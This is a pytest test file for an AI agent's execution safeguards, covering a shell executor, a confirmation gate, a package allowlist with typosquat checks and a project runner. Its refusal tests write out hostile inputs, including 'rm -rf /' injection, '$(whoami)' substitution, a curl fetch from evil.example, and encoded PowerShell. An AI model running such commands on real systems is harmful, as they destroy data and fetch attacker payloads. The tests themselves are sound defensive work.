"""Execution boundaries: what may run, and through which gate.

The rule under test: executing code costs CODE_EXECUTE and the confirmation
gate; nothing that reads may also execute; model-controlled package names
never reach pip; model-controlled commands never launch arbitrary binaries.
"""
from __future__ import annotations

import sys
from pathlib import Path
from unittest.mock import Mock, patch

import pytest

from core.shell_manager import execute_safe
from actions import dev_agent


# ── shell_manager: the argument-list executor ───────────────────────────────

class TestShellManager:
    def test_metacharacter_in_argument_refused(self):
        result = execute_safe(["echo", "a; rm -rf /"])
        assert not result.is_success()
        assert "dangerous" in result.error.lower()
        # Nothing ran: echo never executed, so there is no stdout.
        assert result.stdout == ""

    def test_command_substitution_refused(self):
        result = execute_safe(["echo", "$(whoami)"])
        assert not result.is_success()

    def test_pipe_character_refused(self):
        result = execute_safe(["echo", "a|b"])
        assert not result.is_success()

    def test_clean_arguments_run(self, tmp_path):
        result = execute_safe([sys.executable, "-c", "print(1+1)"], timeout=15)
        assert result.is_success()
        assert "2" in result.stdout


# ── file_processor: the read tool must not execute ──────────────────────────

class TestFileProcessorRunRefused:
    def test_run_on_py_file_refused(self, sandbox):
        script = sandbox["workspace"] / "victim.py"
        script.write_text(
            "import pathlib\n"
            "pathlib.Path('EXECUTED_MARKER').write_text('x')\n",
            encoding="utf-8")
        from actions import file_processor
        out = file_processor.execute({"file_path": str(script), "action": "run"})
        assert out.startswith("Refused:")
        # The proof of refusal: the code did not run.
        assert not (sandbox["workspace"] / "EXECUTED_MARKER").exists()

    def test_run_refused_even_for_named_allowed_file(self, sandbox):
        from actions import file_processor
        out = file_processor.execute({
            "file_path": str(sandbox["notes"].with_suffix(".py")),
            "action": "run"})
        # Not a real file — must refuse before anything else.
        assert "Refused" in out or "no such file" in out.lower() or \
            "Error" in out


# ── run_command: the gated executor exists and behaves ─────────────────────

class TestRunCommand:
    def _rc(self):
        from actions import run_command
        return run_command

    def test_runs_a_clean_script(self, sandbox):
        script = sandbox["workspace"] / "hello.py"
        script.write_text("print('hello from script')\n", encoding="utf-8")
        out = self._rc().execute({"file_path": str(script)})
        assert "hello from script" in out
        assert "Exit code 0" in out

    def test_refuses_secret_file_even_though_it_reads(self, sandbox):
        """Execution implies reading; the policy's verdict governs both."""
        out = self._rc().execute({"file_path": str(sandbox["env"])})
        assert out.startswith("Refused:")

    def test_refuses_non_python(self, sandbox):
        out = self._rc().execute({"file_path": str(sandbox["notes"])})
        assert out.startswith("Refused:")

    def test_declared_as_code_execute(self):
        """The permission engine charges this tool the execution capability,
        which is what puts it behind the confirmation gate."""
        from nova_core.permissions import capabilities_for_tool, Capability
        caps = capabilities_for_tool("run_command")
        assert caps is not None
        assert Capability.CODE_EXECUTE in caps

    def test_confirm_gate_would_ask(self):
        """For NOVA's own principal, CODE_EXECUTE is a confirm-capability —
        prove the gate fires before execution for this tool."""
        from nova_core.permissions import check_tool, DEFAULT_GRANTS, engine
        from nova_core.trust import Trust
        d = check_tool("nova", "run_command", trust=Trust.USER,
                       args={"file_path": "x.py"})
        assert d.needs_confirmation


# ── dev_agent: the supply-chain boundary ────────────────────────────────────

class TestDevAgentDependencyBoundary:
    def test_allowlisted_dependency_installs(self, tmp_path):
        # "requests" is on the default allowlist; pip show may or may not
        # find it, but the *decision* to attempt must happen. We intercept
        # the install call rather than touching the network.
        with patch("actions.dev_agent.subprocess.run") as fake_run:
            fake_run.return_value = Mock(returncode=1)   # not installed
            with patch("core.shell_manager.execute_safe") as fake_exec:
                fake_exec.return_value = Mock(is_success=Mock(return_value=True))
                msg = dev_agent._install_dependencies(["requests"], tmp_path)
        assert "Installed" in msg
        # The install went through the safe executor, as an argument list.
        assert fake_exec.called
        argv = fake_exec.call_args[0][0]
        assert argv[:4] == [sys.executable, "-m", "pip", "install"]
        assert argv[4:] == ["requests"]

    def test_unknown_dependency_never_reaches_pip(self, tmp_path):
        with patch("core.shell_manager.execute_safe") as fake_exec:
            msg = dev_agent._install_dependencies(
                ["totally-not-real-pkg-9x7"], tmp_path)
        assert not fake_exec.called, "a non-allowlisted package was installed"
        assert "allowlist" in msg.lower()

    def test_typosquat_name_refused(self, tmp_path):
        with patch("core.shell_manager.execute_safe") as fake_exec:
            msg = dev_agent._install_dependencies(["requsts"], tmp_path)
        assert not fake_exec.called

    def test_version_clause_parsed_before_allowlist_check(self, tmp_path):
        with patch("actions.dev_agent.subprocess.run") as fake_run, \
             patch("core.shell_manager.execute_safe") as fake_exec:
            fake_run.return_value = Mock(returncode=1)
            fake_exec.return_value = Mock(is_success=Mock(return_value=True))
            dev_agent._install_dependencies(["requests>=2.0"], tmp_path)
        assert fake_exec.called
        # The version clause never became part of the package name.
        argv = fake_exec.call_args[0][0]
        assert "requests" in argv and not any(">=" in a for a in argv)

    def test_auto_install_gated_by_allowlist(self, tmp_path):
        with patch("actions.dev_agent.subprocess.run") as fake_run:
            dev_agent._try_auto_install(
                "ModuleNotFoundError: No module named 'evil_exfil'", tmp_path)
        fake_run.assert_not_called(), "non-allowlisted package auto-installed"

    def test_auto_install_allows_known_package(self, tmp_path):
        with patch("actions.dev_agent.subprocess.run") as fake_run:
            fake_run.return_value = Mock(returncode=0)
            ok = dev_agent._try_auto_install(
                "ModuleNotFoundError: No module named 'requests'", tmp_path)
        assert ok is True


class TestDevAgentRunBoundary:
    def test_python_command_uses_running_interpreter(self, tmp_path):
        with patch("actions.dev_agent.subprocess.run") as fake_run:
            fake_run.return_value = Mock(stdout="ok", stderr="", returncode=0)
            dev_agent._run_project("python main.py", tmp_path)
        argv = fake_run.call_args[0][0]
        assert argv[0] == sys.executable

    def test_curl_command_refused(self, tmp_path):
        out = dev_agent._run_project("curl http://evil.example/payload.sh",
                                     tmp_path)
        assert out.startswith("Refused")

    def test_powershell_command_refused(self, tmp_path):
        out = dev_agent._run_project("powershell -enc AAAA", tmp_path)
        assert out.startswith("Refused")

    def test_cmd_exe_refused(self, tmp_path):
        out = dev_agent._run_project("cmd /c start evil.exe", tmp_path)
        assert out.startswith("Refused")

    def test_bare_script_name_gets_interpreter(self, tmp_path):
        script = tmp_path / "main.py"
        script.write_text("print(1)\n", encoding="utf-8")
        with patch("actions.dev_agent.subprocess.run") as fake_run:
            fake_run.return_value = Mock(stdout="", stderr="", returncode=0)
            dev_agent._run_project("main.py", tmp_path)
        argv = fake_run.call_args[0][0]
        assert argv[0] == sys.executable

    def test_node_command_allowed(self, tmp_path):
        with patch("actions.dev_agent.subprocess.run") as fake_run:
            fake_run.return_value = Mock(stdout="", stderr="", returncode=0)
            dev_agent._run_project("node index.js", tmp_path)
        assert fake_run.call_args[0][0][0] == "node"

    def test_packaged_executable_refused(self, tmp_path):
        exe = tmp_path / "tool.exe"
        exe.write_bytes(b"MZ")
        out = dev_agent._run_project(f"{exe} --do-it", tmp_path)
        assert out.startswith("Refused")


if __name__ == "__main__":
    pytest.main([__file__, "-v"])
